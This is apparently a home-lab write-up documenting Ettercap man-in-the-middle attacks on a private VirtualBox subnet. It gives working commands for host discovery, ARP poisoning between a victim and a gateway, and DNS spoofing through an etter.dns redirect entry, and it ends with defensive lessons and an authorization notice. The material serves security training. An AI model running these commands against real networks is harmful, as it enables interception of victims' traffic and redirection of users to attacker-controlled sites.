# Ettercap

## Overview

Ettercap is a network security tool used for man-in-the-middle (MITM) attacks, packet interception, traffic manipulation, credential harvesting, and network protocol analysis.

This tool was used within the NCSA Cybersecurity Home Lab environment to demonstrate ARP spoofing, DNS poisoning, packet interception, and traffic analysis techniques in a controlled educational lab environment.

---

# Objectives

The primary objectives of using Ettercap in this lab environment were:

- Understand man-in-the-middle attack methodologies
- Perform ARP spoofing attacks
- Intercept and analyze network traffic
- Demonstrate DNS poisoning attacks
- Capture unencrypted network traffic
- Analyze attacker and victim communication flows

---

# Lab Environment

| Component | Details |
|---|---|
| Operating System | Kali Linux |
| Hypervisor | VirtualBox |
| Tool | Ettercap |
| Packet Analysis | Wireshark |
| Lab Subnet | 10.0.2.0/24 |

---

# Core Features

- ARP spoofing
- DNS spoofing
- Packet interception
- Traffic manipulation
- Credential capture
- Packet filtering
- Network host discovery
- MITM attack simulation

---

# Installation

## Verify Existing Installation

```bash
ettercap --help
```

## Install on Kali Linux

```bash
sudo apt update
sudo apt install ettercap-text-only
```

Optional GUI version:

```bash
sudo apt install ettercap-graphical
```

---

# IP Forwarding

IP forwarding must be enabled before performing MITM attacks.

## Enable IP Forwarding

```bash
sudo sysctl -w net.ipv4.ip_forward=1
```

## Verify IP Forwarding

```bash
cat /proc/sys/net/ipv4/ip_forward
```

Expected output:

```text
1
```

---

# Network Discovery

Identify hosts on the local network before performing MITM attacks.

## ARP Scan Example

```bash
sudo netdiscover -r 10.0.2.0/24
```

---

# ARP Spoofing

ARP spoofing was used to position the attacking system between the victim and gateway devices.

## Launch Ettercap Text Interface

```bash
sudo ettercap -T -q -i eth0
```

---

# MITM Attack

## Start ARP Poisoning Attack

```bash
sudo ettercap -T -M arp:remote /10.0.2.5/ /10.0.2.1/
```

Example:
- Victim IP: 10.0.2.5
- Gateway IP: 10.0.2.1

---

# DNS Spoofing

DNS spoofing was used to redirect victim traffic to attacker-controlled destinations.

## Edit DNS Configuration

```bash
sudo nano /etc/ettercap/etter.dns
```

Example entry:

```text
example.com A 10.0.2.3
```

---

## Start DNS Spoofing Attack

```bash
sudo ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /10.0.2.5/ /10.0.2.1/
```

---

# Packet Analysis

Captured traffic was analyzed using Wireshark to observe:
- DNS requests
- HTTP traffic
- ARP poisoning behavior
- packet redirection
- victim communication flows

---

# Related Labs

- ARP Spoofing
- DNS Poisoning
- Wireshark Traffic Analysis
- Packet Capture
- MITM Attack Simulation

---

# Recommended Screenshots

Recommended screenshots for documentation:
- successful ARP poisoning
- Ettercap session output
- DNS spoofing configuration
- intercepted traffic
- Wireshark packet captures
- victim DNS requests
- MITM traffic flow

---

# Common Commands

| Command | Purpose |
|---|---|
| ettercap -T | Launch text interface |
| -M arp:remote | Enable ARP spoofing |
| -P dns_spoof | Enable DNS spoofing plugin |
| netdiscover | Discover hosts on network |

---

# Common Troubleshooting

## Traffic Not Forwarding

### Symptoms
- victim loses internet connectivity
- traffic stops flowing

### Resolution

Enable IP forwarding:

```bash
sudo sysctl -w net.ipv4.ip_forward=1
```

---

## Hosts Not Discovered

### Resolution
- verify network adapter settings
- confirm systems are on same subnet
- check VirtualBox network configuration

---

## DNS Spoofing Not Working

### Resolution
- verify entries in `/etc/ettercap/etter.dns`
- restart Ettercap session
- confirm plugin is enabled

---

# Lessons Learned

- ARP spoofing can redirect local network traffic through an attacker system.
- Unencrypted traffic can be intercepted during MITM attacks.
- DNS poisoning can redirect users to attacker-controlled destinations.
- Proper network segmentation and encryption reduce MITM attack effectiveness.

---

# Ethical Use Notice

All testing documented in this repository was conducted in a controlled educational environment for cybersecurity training purposes only.

Do not perform MITM attacks, ARP spoofing, or DNS poisoning against networks or systems without explicit authorization.